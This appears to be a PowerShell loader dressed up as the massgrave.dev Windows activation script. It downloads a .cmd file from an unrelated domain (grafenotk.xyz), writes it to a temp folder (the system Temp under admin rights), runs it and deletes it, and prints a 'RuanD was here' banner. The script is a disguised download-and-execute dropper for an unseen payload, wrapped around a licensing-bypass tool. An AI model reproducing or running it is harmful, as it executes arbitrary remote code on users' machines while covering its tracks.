# Check massgrave.dev for more details

$ErrorActionPreference = "Stop"

write-host
Write-Host -ForegroundColor Green "RuanD esteve por aqui hehehe"
write-host

# Enable TLSv1.2 for compatibility with older clients for current session
[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12

$DownloadURL1 = 'grafenotk.xyz/active/index.cmd'
$DownloadURL2 = 'grafenotk.xyz/active/index.cmd'

$URLs = @($DownloadURL1, $DownloadURL2)
$RandomURL1 = Get-Random -InputObject $URLs
$RandomURL2 = $URLs -ne $RandomURL1

try {
    $response = Invoke-WebRequest -Uri $RandomURL1 -UseBasicParsing
}
catch {
	$response = Invoke-WebRequest -Uri $RandomURL2 -UseBasicParsing
}

$rand = Get-Random -Maximum 99999999
$isAdmin = [bool]([Security.Principal.WindowsIdentity]::GetCurrent().Groups -match 'S-1-5-32-544')
$FilePath = if ($isAdmin) { "$env:SystemRoot\Temp\RuanD_$rand.cmd" } else { "$env:TEMP\RuanD_$rand.cmd" }

$ScriptArgs = "$args "
$prefix = "@::: $rand `r`n"
$content = $prefix + $response
Set-Content -Path $FilePath -Value $content

Start-Process $FilePath $ScriptArgs -Wait

$FilePaths = @("$env:TEMP\RuanD*.cmd", "$env:SystemRoot\Temp\RuanD*.cmd")
foreach ($FilePath in $FilePaths) { Get-Item $FilePath | Remove-Item }